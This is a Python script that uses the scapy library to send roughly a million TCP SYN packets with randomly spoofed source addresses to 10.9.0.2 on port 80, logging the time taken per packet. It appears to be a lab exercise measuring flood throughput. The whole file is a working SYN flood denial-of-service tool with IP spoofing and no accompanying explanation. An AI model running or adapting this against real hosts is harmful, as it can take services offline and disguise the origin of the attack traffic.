import time
import random
from scapy.all import *

def random_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"

target_ip = "10.9.0.2"
target_port = 80
filename = 'syns_results_p.txt'
total_time = 0.0
runs = 1000000

with open(filename, 'w') as f:
    for i in range(1,runs):
        if i % 10000 == 0:
            print(f"At {i/10000}%")
        start_time = time.time()

        src_ip = random_ip()
        packet = IP(src=src_ip, dst=target_ip) / TCP(dport=target_port, flags="S")
        send(packet, verbose=False)

        end_time = time.time()
        time_taken = end_time - start_time
        total_time += time_taken

        f.write(f"Packet {i}, Time: {time_taken:.6f} seconds\n")
    f.write(f"Total time to send all packets: {total_time:.6f} seconds\n")
    f.write(f"Average time per packet: {total_time / runs:.6f} seconds\n")
